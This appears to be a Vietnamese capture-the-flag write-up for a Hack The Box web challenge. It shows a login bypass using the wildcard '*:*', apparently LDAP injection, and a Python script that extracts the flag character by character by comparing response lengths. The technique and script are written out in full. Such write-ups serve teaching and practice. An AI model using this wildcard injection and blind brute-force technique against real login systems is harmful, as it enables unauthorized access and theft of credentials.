# Phân tích

Tham số `message` có thể inject:

![image](https://user-images.githubusercontent.com/114990730/209164490-605200da-8b9b-4183-8759-12c6fba153fd.png)

Chứa lỗ hổng XSS nhưng không khai thác được trong trường hợp này:

![image](https://user-images.githubusercontent.com/114990730/209164714-fcb0c60e-69ce-4801-a012-683e67937a7d.png)

Hơi guessing chút login page bypass bằng `*:*`

![image](https://user-images.githubusercontent.com/114990730/209172304-ab7fe049-4982-4558-bd6a-28c3952e6180.png)

Sau đó chỉ có duy nhất chức năng Search:

![image](https://user-images.githubusercontent.com/114990730/209172402-e4959737-8834-43c6-ba6a-431511743937.png)

Chức năng trả về các đoạn text chứa từ khóa tìm kiếm:

![image](https://user-images.githubusercontent.com/114990730/209172600-2b807a55-4f91-448a-b930-d805e437113e.png)

Có thể sử dụng wildcard characters:

![image](https://user-images.githubusercontent.com/114990730/209175968-8f74287f-bb62-4b7e-af73-f2ab09ed851f.png)

Cũng khá guessing, từ đây nghĩ đến flag có thể là username hoặc password trong form login:

![image](https://user-images.githubusercontent.com/114990730/209176206-bdc70819-14bb-4cab-9156-a7a119676c96.png)

Khi mật khẩu đúng thì độ dài response là 2586, ngược lại là 2214, phân biệt dựa vào yếu tố này. Viết script brute force password:

```
import requests
import string

string = string.printable
string = string[:-4]
string = string.replace('*', '')

url = 'http://159.65.19.4:30908/login'

flag = 'HTB{'

while (True):
    for char in string:
        password = flag + char + '*'
        data = {'username': '*', 'password': password}
        response = requests.post(url = url, data = data)
        if len(response.text) == 2586:
            flag = flag + char
            print(flag)
            break

# print(len(response.text)) # 2586
```

![image](https://user-images.githubusercontent.com/114990730/209180639-01979527-4df2-4f18-962a-4d857f66883c.png)
